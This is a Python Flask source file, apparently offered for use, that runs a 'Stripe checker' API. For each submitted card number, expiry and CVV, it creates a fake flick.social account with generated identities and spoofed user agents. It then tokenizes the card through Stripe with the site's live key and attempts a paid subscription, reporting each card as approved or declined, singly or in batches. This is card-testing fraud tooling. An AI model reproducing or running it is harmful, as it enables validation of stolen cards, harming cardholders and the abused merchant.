# ============================================
# FILE: flick_stripe_api.py
# FLICK.SOCIAL STRIPE CHECKER API
# ============================================

from flask import Flask, request, jsonify
import requests
import json
import time
import random
from faker import Faker
from user_agent import generate_user_agent
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)
executor = ThreadPoolExecutor(max_workers=5)

fake = Faker()

# ==================== CONFIG ====================
PLAN_ID = "SoloYearlyV2"

# ==================== FUNCTIONS ====================

def generate_fake_data():
    """Generate fake user data"""
    name = fake.name()
    email = fake.user_name() + str(random.randint(100, 999)) + "@gmail.com"
    password = "Test@" + str(random.randint(100000, 999999))
    user_agent = generate_user_agent()
    return {
        'name': name,
        'email': email,
        'password': password,
        'user_agent': user_agent
    }

def register_user(email, password, name, user_agent):
    """Step 1: Register new user"""
    headers = {
        'authority': 'www.flick.social',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://www.flick.social',
        'referer': 'https://www.flick.social/app/register',
        'user-agent': user_agent,
    }
    
    register_data = {
        'query': '''
        mutation Register($input: RegisterInput!) {
            register(input: $input) {
                token {
                    accessToken
                    refreshToken
                }
                user {
                    id
                    name
                    email
                }
            }
        }
        ''',
        'variables': {
            'input': {
                'isNoCard': False,
                'isFreemium': False,
                'plansVersion': 'v2',
                'marketingFunnelSource': None,
                'email': email,
                'password': password,
                'name': name,
            }
        }
    }
    
    response = requests.post(
        'https://www.flick.social/api/graphql',
        headers=headers,
        json=register_data,
        timeout=30
    )
    
    if response.status_code != 200:
        return None, f"HTTP {response.status_code}"
    
    resp_json = response.json()
    
    if 'errors' in resp_json:
        return None, str(resp_json['errors'])
    
    access_token = resp_json['data']['register']['token']['accessToken']
    refresh_token = resp_json['data']['register']['token']['refreshToken']
    user_id = resp_json['data']['register']['user']['id']
    
    return {
        'access_token': access_token,
        'refresh_token': refresh_token,
        'user_id': user_id,
        'email': email
    }, None

def get_stripe_session(user_agent):
    """Step 2: Get Stripe session ID"""
    headers = {
        'authority': 'm.stripe.com',
        'accept': '*/*',
        'content-type': 'text/plain;charset=UTF-8',
        'origin': 'https://m.stripe.network',
        'referer': 'https://m.stripe.network/',
        'user-agent': user_agent,
    }
    
    data = {
        'JTdCJTIybXVpZCUyMiUzQSUyMjQ0ZDliN2ExLTdiNjItNDAxOS1iOWRiLWZjOGMzMTM1NGFiOGY5NTY3NCUyMiUyQyUyMnNpZCUyMiUzQSUyMmI0ZmNmZGZkLTZlMTctNDkyNS04ZTMxLWFlMDViYzcwZmFkMjg5NzlkYiUyMiUyQyUyMnVybCUyMiUzQSUyMmh0dHBzJTNBJTJGJTJGWF92V09wWVF3MnlpbVB6YTJsZGlsc3NaMVZnbEFoNlYzaHhrVFRja20xNC5NSU95N1JuQlFjUTRYcHBIbUtsYVE2VTZOVWRTWTFoUHdacWN5YUlCeG1jLkoxRHBJWVFMTkNHeUxCZjdQRElxM2hVZ3VHUjFJR3JzRGFMZnFKcHhQNzglMkZqdDV6WVZKWXBxVDJlcmFtTGNCMGhYU0Z5UUFId3lKbFQ1WTlRXzhfMWR3JTJGc3VRSjZsZ19jbDlnQ21KTk5KZWdrWURPV3JNSndVYklySC1tU0dLbW1FOCUyMiUyQyUyMnNvdXJjZSUyMiUzQSUyMm1vdXNlLXRpbWluZ3MtMTAtdjIlMjIlMkMlMjJkYXRhJTIyJTNBJTVCODYzJTJDMzg4MiUyQzUyMjglMkM5ODExJTJDMjExMTglNUQlN0Q': '',
    }
    
    response = requests.post(
        'https://m.stripe.com/6',
        headers=headers,
        data=data,
        timeout=30
    )
    
    if response.status_code != 200:
        return None, f"HTTP {response.status_code}"
    
    resp_json = response.json()
    return {
        'sid': resp_json.get('sid'),
        'guid': resp_json.get('guid'),
        'muid': resp_json.get('muid')
    }, None

def create_stripe_token(card_data, stripe_session, user_agent):
    """Step 3: Create Stripe token"""
    cc = card_data['cc']
    mm = card_data['mm']
    yy = card_data['yy']
    cvv = card_data['cvv']
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': user_agent,
    }
    
    data = f'guid={stripe_session["guid"]}&muid={stripe_session["muid"]}&sid={stripe_session["sid"]}&referrer=https%3A%2F%2Fwww.flick.social&time_on_page=1185985&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F13f5e7dcb8%3B+stripe-js-v3%2F13f5e7dcb8%3B+card-element&key=pk_live_2DqG7KLlmixNrSFyf1azyJLd00nVfLrIoT'
    
    response = requests.post(
        'https://api.stripe.com/v1/tokens',
        headers=headers,
        data=data,
        timeout=30
    )
    
    if response.status_code != 200:
        return None, f"HTTP {response.status_code}: {response.text[:100]}"
    
    token_id = response.json().get('id')
    if not token_id:
        return None, "No token ID received"
    
    return token_id, None

def create_subscription(token_id, access_token, user_agent):
    """Step 4: Create paid subscription"""
    headers = {
        'authority': 'www.flick.social',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {access_token}',
        'content-type': 'application/json',
        'origin': 'https://www.flick.social',
        'referer': 'https://www.flick.social/app/register',
        'user-agent': user_agent,
    }
    
    subscription_data = {
        'query': '''
        mutation CreatePaidSubscription($input: CreateSubscriptionInput!) {
            createPaidSubscription(input: $input) {
                id
                subscription {
                    status
                    nextBillingDate
                }
                customer {
                    id
                    cardStatus
                    card {
                        brand
                        last4
                        expiryMonth
                        expiryYear
                    }
                }
            }
        }
        ''',
        'variables': {
            'input': {
                'token': token_id,
                'type': 'Card',
                'country': 'US',
                'vatNumber': '',
                'planId': PLAN_ID,
                'addons': [],
                'couponCode': None,
            }
        }
    }
    
    response = requests.post(
        'https://www.flick.social/api/graphql',
        headers=headers,
        json=subscription_data,
        timeout=30
    )
    
    if response.status_code != 200:
        return None, f"HTTP {response.status_code}"
    
    resp_json = response.json()
    
    if 'errors' in resp_json:
        error_msg = resp_json['errors'][0].get('message', 'Unknown error')
        return None, error_msg
    
    if 'data' in resp_json and resp_json['data'].get('createPaidSubscription'):
        return resp_json['data']['createPaidSubscription'], None
    
    return None, "Unknown response"

def check_card(card_string):
    """Main card check function"""
    start_time = time.time()
    
    # Parse card
    parts = card_string.split('|')
    if len(parts) < 4:
        return {
            'status': 'ERROR',
            'message': 'Invalid format. Use: CC|MM|YY|CVV',
            'time': 0
        }
    
    card_data = {
        'cc': parts[0].replace(' ', ''),
        'mm': parts[1].zfill(2),
        'yy': parts[2][-2:] if len(parts[2]) > 2 else parts[2],
        'cvv': parts[3]
    }
    
    result = {
        'card': f"{card_data['cc'][:6]}...{card_data['cc'][-4:]}",
        'bin': card_data['cc'][:6],
        'status': 'UNKNOWN',
        'message': '',
        'time': 0
    }
    
    try:
        # Step 1: Generate fake data
        fake_data = generate_fake_data()
        
        # Step 2: Register user
        user_data, error = register_user(
            fake_data['email'], 
            fake_data['password'], 
            fake_data['name'], 
            fake_data['user_agent']
        )
        
        if error:
            result['status'] = 'ERROR'
            result['message'] = f'Registration failed: {error}'
            result['time'] = round(time.time() - start_time, 2)
            return result
        
        # Step 3: Get Stripe session
        stripe_session, error = get_stripe_session(fake_data['user_agent'])
        
        if error:
            result['status'] = 'ERROR'
            result['message'] = f'Stripe session failed: {error}'
            result['time'] = round(time.time() - start_time, 2)
            return result
        
        # Step 4: Create Stripe token
        token_id, error = create_stripe_token(
            card_data, 
            stripe_session, 
            fake_data['user_agent']
        )
        
        if error:
            result['status'] = 'DECLINED'
            result['message'] = error
            result['time'] = round(time.time() - start_time, 2)
            return result
        
        # Step 5: Create subscription
        subscription, error = create_subscription(
            token_id, 
            user_data['access_token'], 
            fake_data['user_agent']
        )
        
        if error:
            result['status'] = 'DECLINED'
            result['message'] = error
            result['time'] = round(time.time() - start_time, 2)
            return result
        
        # Success
        customer = subscription.get('customer', {})
        card_info = customer.get('card', {})
        
        result['status'] = 'APPROVED'
        result['message'] = 'Subscription created successfully'
        result['subscription_status'] = subscription.get('subscription', {}).get('status')
        result['card_brand'] = card_info.get('brand')
        result['card_last4'] = card_info.get('last4')
        result['time'] = round(time.time() - start_time, 2)
        
        return result
        
    except Exception as e:
        result['status'] = 'ERROR'
        result['message'] = str(e)
        result['time'] = round(time.time() - start_time, 2)
        return result

# ==================== API ENDPOINTS ====================

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'name': 'Flick Social Stripe Checker API',
        'version': '1.0',
        'author': '@Rapid broo🔥',
        'endpoints': {
            '/check': 'POST - Single card check',
            '/batch': 'POST - Multiple cards check',
            '/check_get': 'GET - Browser click'
        }
    })

@app.route('/check', methods=['POST'])
def api_check():
    """Single card check"""
    data = request.get_json()
    
    if not data or 'combo' not in data:
        return jsonify({'error': 'combo parameter required'}), 400
    
    result = check_card(data['combo'])
    return jsonify(result)

@app.route('/check_get', methods=['GET'])
def api_check_get():
    """GET endpoint for browser click"""
    combo = request.args.get('cc')
    
    if not combo:
        return jsonify({'error': 'cc parameter required'}), 400
    
    result = check_card(combo)
    return jsonify(result)

@app.route('/batch', methods=['POST'])
def api_batch():
    """Batch card check"""
    data = request.get_json()
    
    if not data or 'combos' not in data:
        return jsonify({'error': 'combos array required'}), 400
    
    combos = data['combos']
    if not isinstance(combos, list):
        return jsonify({'error': 'combos must be an array'}), 400
    
    if len(combos) > 50:
        return jsonify({'error': 'Max 50 combos allowed'}), 400
    
    results = []
    with ThreadPoolExecutor(max_workers=5) as ex:
        futures = [ex.submit(check_card, combo) for combo in combos]
        for future in futures:
            results.append(future.result())
    
    approved = [r for r in results if r.get('status') == 'APPROVED']
    declined = [r for r in results if r.get('status') == 'DECLINED']
    
    return jsonify({
        'total': len(results),
        'approved': len(approved),
        'declined': len(declined),
        'results': results
    })

# ==================== MAIN ====================

if __name__ == '__main__':
    print("="*60)
    print("🔥 FLICK SOCIAL STRIPE API 🔥")
    print("="*60)
    print("\n📡 Endpoints:")
    print("   POST /check      - Single card")
    print("   POST /batch      - Multiple cards")
    print("   GET  /check_get  - Browser click")
    print("\n🚀 Server: http://localhost:5000")
    print("="*60)
    
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)